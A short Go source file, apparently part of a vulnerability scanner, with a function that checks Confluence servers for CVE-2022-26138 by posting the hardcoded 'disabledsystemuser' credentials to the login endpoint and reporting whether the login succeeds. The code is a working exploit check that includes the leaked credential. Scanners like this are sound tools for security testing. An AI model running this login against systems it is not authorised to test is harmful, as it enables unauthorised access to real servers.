package confluence

import (
	"Predator/pkg/utils"
)

func CVE_2022_26138(u string) bool {
	headers := make(map[string]string, 0)
	headers["Content-Type"] = "application/x-www-form-urlencoded"
	if req, err := utils.HttpRequset(u+"/dologin.action", "POST", "os_username=disabledsystemuser&os_password=disabled1system1user6708&login=%E7%99%BB%E5%BD%95&os_destination=", false, headers); err == nil {
		if req.StatusCode == 302 && req.Header.Get("X-Seraph-LoginReason") == "OK" {
			return true
		}
	}
	return false
}
